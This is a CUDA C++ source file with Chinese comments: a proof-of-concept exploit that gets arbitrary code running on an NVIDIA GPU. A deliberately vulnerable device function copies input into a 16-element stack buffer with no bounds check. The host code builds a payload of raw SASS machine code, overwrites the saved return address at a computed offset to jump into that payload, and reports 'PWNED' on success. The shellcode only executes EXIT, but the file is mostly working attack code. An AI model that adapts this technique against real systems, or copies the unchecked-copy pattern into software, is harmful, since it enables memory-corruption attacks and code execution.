#include <stdio.h>
#include <cuda_runtime.h>
#include <iostream>

// ==========================================
// 1. 受害者内核 (Victim Kernel)
// ==========================================
__device__ void vulnerable_function(int* input_data, int size, int depth) {
    // 栈上的缓冲区
    int local_buffer[16]; 
    
    // 初始化一下
    local_buffer[0] = 0xAAAAAAAA;

    // 漏洞点：无检查拷贝
    for (int i = 0; i < size; ++i) {
         local_buffer[i] = input_data[i];
    }

    // 递归调用，强制将返回地址压栈 (Spill to Stack)
    if (depth > 0) {
        vulnerable_function(input_data, size, depth - 1);
    }
}

__global__ void exploit_kernel(int* input_data, int size) {
    vulnerable_function(input_data, size, 1);
}

// ==========================================
// 2. 攻击者主程序 (Host Exploit)
// ==========================================
int main() {
    int* d_data;
    size_t buffer_size = 1024 * sizeof(int);
    cudaMalloc(&d_data, buffer_size);
    
    // ---------------------------------------------------------
    // 关键步骤 A: 获取 Global Memory 的地址
    // ---------------------------------------------------------
    // 我们需要知道 Shellcode 被存到了哪里。
    // 在 CUDA 中，d_data 指针的值就是 GPU 虚拟地址 (UVA)。
    printf("[*] Target Address (d_data): %p\n", d_data);
    
    // 准备 Payload 数组
    // 我们用 long long (64位) 来填充，方便处理指令和地址
    unsigned long long h_payload[64]; 
    
    // 初始化为 NOP 或者 垃圾数据
    for(int i=0; i<64; i++) h_payload[i] = 0x0;

    // ---------------------------------------------------------
    // 关键步骤 B: 注入 Shellcode (EXIT 指令)
    // ---------------------------------------------------------
    // 这里填入你在第一步用 cuobjdump 看到的 16字节 机器码
    // 注意：小端序 (Little Endian)
    
    // 指令的低 64 位 (Opcode)
    h_payload[0] = 0x000000000000794d; 
    
    // 指令的高 64 位 (Control info)
    h_payload[1] = 0x000fea0003800000; 

    // 现在 h_payload[0] 和 [1] 构成了完整的 EXIT 指令
    // 当 GPU 跳转到这里时，它会执行 EXIT，程序正常结束。

    // ---------------------------------------------------------
    // 关键步骤 C: 覆盖返回地址
    // ---------------------------------------------------------
    // 之前计算过：
    // Padding 是 84 字节 = 21 个 int = 10.5 个 long long
    // 所以返回地址在 int 数组的 index 21
    // 也就是 long long 数组的 index 10 和 11 (如果不确定，我们把附近都覆盖了)
    
    // 在 int 数组看来，RET 在 index 21 (低32位) 和 22 (高32位)
    // 我们需要把 d_data 的地址拆分填进去
    
    unsigned long long target_addr = (unsigned long long)d_data;
    
    // 将 payload 转换回 int 指针方便操作索引
    int* h_payload_int = (int*)h_payload;
    
    // 覆盖返回地址！
    // 指向我们的 Shellcode (也就是 d_data 的起始位置)
    h_payload_int[21] = (int)(target_addr & 0xFFFFFFFF);         // 地址低32位
    h_payload_int[22] = (int)((target_addr >> 32) & 0xFFFFFFFF); // 地址高32位

    printf("[*] Overwriting Return Address at index 21/22 with: %p\n", (void*)target_addr);

    // ---------------------------------------------------------
    // 3. 发送 Payload 并执行
    // ---------------------------------------------------------
    cudaMemcpy(d_data, h_payload, buffer_size, cudaMemcpyHostToDevice);

    printf("[*] Launching attack kernel...\n");
    
    // size = 30，足够触发溢出覆盖到 index 21/22
    exploit_kernel<<<1, 1>>>(d_data, 30);

    cudaDeviceSynchronize();
    
    // ---------------------------------------------------------
    // 4. 验证结果
    // ---------------------------------------------------------
    cudaError_t err = cudaGetLastError();
    if (err == cudaSuccess) {
        printf("\n[!!!] PWNED! Kernel finished successfully.\n");
        printf("      This means the GPU executed data as code!\n");
        printf("      (If it failed, you would see 'Illegal Instruction' or 'Misaligned Address')\n");
    } else {
        printf("\n[X] Attack Failed. Error: %s\n", cudaGetErrorString(err));
        printf("    Check your Shellcode SASS bytes or Padding offset.\n");
    }

    cudaFree(d_data);
    return 0;
}